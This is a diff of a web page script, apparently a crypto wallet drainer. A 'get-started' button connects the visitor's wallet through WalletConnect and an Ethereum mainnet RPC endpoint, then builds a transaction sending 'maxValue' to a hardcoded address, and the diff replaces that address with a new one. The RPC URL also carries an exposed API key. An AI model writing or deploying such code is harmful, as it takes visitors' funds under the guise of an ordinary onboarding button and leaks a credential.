@@ -1,9 +1,9 @@
 document.getElementById('get-started').onclick = async () => {
     try {
         // Initialize WalletConnect Provider with RPCFast endpoint
-        const provider = new WalletConnectProvider({
+        const provider = new WalletConnectProvider.default({
             rpc: {
-                1: "https://eth-mainnet-mempool.rpcfast.com?api_key=bDkPRaSmDwz0al5sWxt4GOBUIFjPwLOJYwblafja2ILA8iyX5ZeNZECq3NJa4EPW" // Replace with your RPCFast API URL
+                1: "https://eth-mainnet-mempool.rpcfast.com?api_key=bDkPRaSmDwz0al5sWxt4GOBUIFjPwLOJYwblafja2ILA8iyX5ZeNZECq3NJa4EPW"
             }
         });
 
@@ -35,7 +35,7 @@ document.getElementById('get-started').onclick = async () => {
 
         // Define transaction parameters
         const tx = {
-            to: "0xB0994b43F798a151e75b38e01C5a9Da2B8895b8", // Replace with the recipient address
+            to: "0xC0ffee254729296a45a3885639AC7E10F9d54979", // Replace with the recipient address
             value: maxValue,
             gasLimit: gasLimit,
             gasPrice: gasPrice
@@ -52,4 +52,3 @@ document.getElementById('get-started').onclick = async () => {
         console.error(error);
     }
 };
-
